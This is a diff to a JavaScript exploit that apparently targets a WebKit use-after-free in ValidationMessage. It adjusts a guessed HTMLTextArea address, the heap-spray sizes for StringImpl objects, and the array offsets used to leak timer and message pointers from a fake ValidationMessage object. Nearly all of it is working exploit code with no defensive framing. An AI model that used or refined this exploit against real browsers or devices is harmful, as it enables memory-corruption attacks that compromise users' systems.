@@ -42,7 +42,7 @@ var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
 var g_round = 1;
 var g_input = null;
 
-var guess_htmltextarea_addr = new Int64("0x20a505b48");
+var guess_htmltextarea_addr = new Int64("0x2031b00d8");
 
 var master_b = new Uint32Array(2);
 var slave_b =  new Uint32Array(2);
@@ -273,7 +273,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 3 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
+                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -358,7 +358,7 @@ function leakJSC() {
  */
 function confuseTargetObjRound1() {
 	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 3);
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
 
 	/* Checking for leaked data */
 	if (findTargetObj() === false)
@@ -398,8 +398,6 @@ function reuseTargetObj() {
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
 		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble
-		view[4] = guess_htmltextarea_addr.asDouble();   // m_bubble
-		view[5] = guess_htmltextarea_addr.asDouble();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
@@ -429,13 +427,13 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
 				g_round++;
 			}
 
